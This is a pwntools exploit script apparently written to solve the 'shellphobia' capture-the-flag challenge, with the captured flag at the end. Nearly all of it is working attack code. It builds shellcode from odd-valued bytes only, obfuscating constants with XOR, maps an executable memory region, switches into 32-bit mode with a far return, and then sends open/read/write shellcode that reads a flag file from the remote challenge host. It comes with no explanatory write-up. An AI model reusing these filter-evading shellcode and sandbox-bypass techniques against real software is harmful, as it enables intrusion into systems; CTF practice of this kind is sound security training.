from pwn import *


# open + read + write in 32bit mode

context.update(arch='i386', os='linux')  # 32-bit
sh_shellcode = shellcraft.open('flag', 0)             # eax = open("flag.txt", O_RDONLY)
sh_shellcode += shellcraft.read('eax', 'esp', 100)        # read(fd, esp, 100)
sh_shellcode += shellcraft.write(1, 'esp', 100)           # write(1, esp, 100)
_32_sh_payload = asm('nop') * 100 + asm(sh_shellcode)


elf = context.binary = ELF("shellphobia")


# mmap mem
mmap = asm('''\
              
    mov r11d, 0xffffff11
    xor r11d, 0xffffff33
    xor r9 , r9
    or     r9,r11          
    lea r10d , [r9]              
              
    xor r9 , r9
    dec r9
    lea r8 , [r9]              

    
    xor    ecx,ecx
    movzx  edx,cx
    movzx  esi,cx
    lea  edx,[ecx+7]
    lea  eax,[ecx+9]

    mov r11d, 0xffffff9f
    xor r11d, 0xffffffff
    xor    r9,r9
    or     r9,r11          
    shl    r9,0xf
    shl    r9,1
    or     r9,r11    
    push r9      
    pop rdi
    lea  esi,[r9]
              
    xor r9 , r9

              
        
    syscall

    
''')


# write basic shellcode in mmaped mem
# xor eax, eax
# inc eax
# inc eax
# inc eax           ; eax = 3
# pop ebx           ; ebx = 0
# mov eax, 0x600060 ; ecx = 0x600060
# mov edx, 500      ; edx = 500
# int 80            ; read


_32bit_code = asm("""
    mov r11d, 0xffffff9f
    xor r11d, 0xffffffff
    xor    r9,r9
    or     r9,r11          
    shl    r9,0xf
    shl    r9,1
    or     r9,r11   
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
    push r9
                  

    // xor eax , eax          
    mov r11d, 0xffffffff
    xor r11d, 0xffffffcf        
    xor r9 , r9
    or r9,r11          
    inc r9
    mov r11d, r9d
    pop r9
    mov [r9] , r11

    mov r11d, 0xffffffff
    xor r11d, 0xffffff3f                       
    xor r9 , r9
    or r9,r11          
    mov r11d, r9d
    pop r9
    inc r9
    mov [r9] , r11                  
                  
    // inc eax
    mov r11d, 0xffffffff
    xor r11d, 0xffffffbf        
    xor r9 , r9
    or r9,r11          
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    mov [r9] , r11                  

                  
    // inc eax
    mov r11d, 0xffffffff
    xor r11d, 0xffffffbf        
    xor r9 , r9
    or r9,r11          
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11         

    // inc eax
    mov r11d, 0xffffffff
    xor r11d, 0xffffffbf        
    xor r9 , r9
    or r9,r11          
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11                             


    // pop ebx (0)              
    mov r11d, 0xffffffff
    xor r11d, 0xffffffa3                       
    xor r9 , r9
    or r9,r11     
    dec r9     
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11   
                  
        
                  
    // baf4010000 mov edx, 500
    mov r11d, 0xffffffff
    xor r11d, 0xffffff45    
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11 
                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffff0b    
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11                     

                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffffff  
    xor r9 , r9
    or r9,r11     
    inc r9
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11                  

    push r9 
    xor r9 , r9
    mov r11d, r9d
    pop r9
    inc r9
    mov [r9] , r11                  
    inc r9
    mov [r9] , r11   

                  

    // b9 60 00 60 00 mov ecx, 0x60060
    mov r11d, 0xffffffff
    xor r11d, 0xffffff47
    xor r9 , r9
    or r9,r11     
    inc r9
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11                       



                  
                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffff9f    
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11      


                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffffff    
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11    

                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffff9f    
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11                     

                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffffff    
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11      

                                               

    // int 80
    mov r11d, 0xffffffff
    xor r11d, 0xffffff31        
    xor r9 , r9
    or r9,r11          
    dec r9
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11
                  
    mov r11d, 0xffffffff
    xor r11d, 0xffffff7f                       
    xor r9 , r9
    or r9,r11          
    mov r11d, r9d
    pop r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    inc r9
    mov [r9] , r11
""")



_32bit_shit_steup = asm("""


    // 0x60075c
    mov r11d, 0xffffff9f
    xor r11d, 0xffffffff
    xor    r9,r9
    or     r9,r11          
    shl    r9,0xf
    shl    r9,1
                    
    mov r11d, 0xfffff7a3
    xor r11d, 0xffffffff
    or     r9,r11
    push r9
    lea esp, [r9]
    
                        

    // 23
    push r9
    mov r11d, 0xffffff11
    xor r11d, 0xffffff33
    xor r9 , r9
    or     r9,r11      
    inc r9   
    shl    r9,0xf
    shl    r9,1
                              
    // 0x600060
                        
    mov r11d, 0xffffff9f
    xor r11d, 0xffffffff
    or     r9,r11          
    shl    r9,0xf
    shl    r9,1
    or     r9,r11
    push  r9
    pop r11
    pop r9
    mov [r9] , r11

    
    retfd                         
""")



payload = mmap + _32bit_code  + _32bit_shit_steup

print(payload.hex())
for i in payload:
    if i%2 != 1:
        print("bad")
        print(hex(i))
        exit()


# p = process(aslr=False)
p = remote("pwn.blitzhack.xyz", 1337)


print(len(payload))

p.sendline(b"A" * 16)
p.sendline("1200")


# gdb.attach(p,"b *0x55555555644d")

p.sendlineafter("hellcode: ",payload)


p.recvuntil("shellcode...")
input("SEND?")
 

p.sendline(_32_sh_payload)

p.interactive()

# Blitz{0v3rc0m3_y0ur_sh3llph0b14_w1th_0dd_byt3_sh3llc0d3_4nd_s3cc0mp_byp4ss_n0_m0r3_f34r_0f_sh3lls}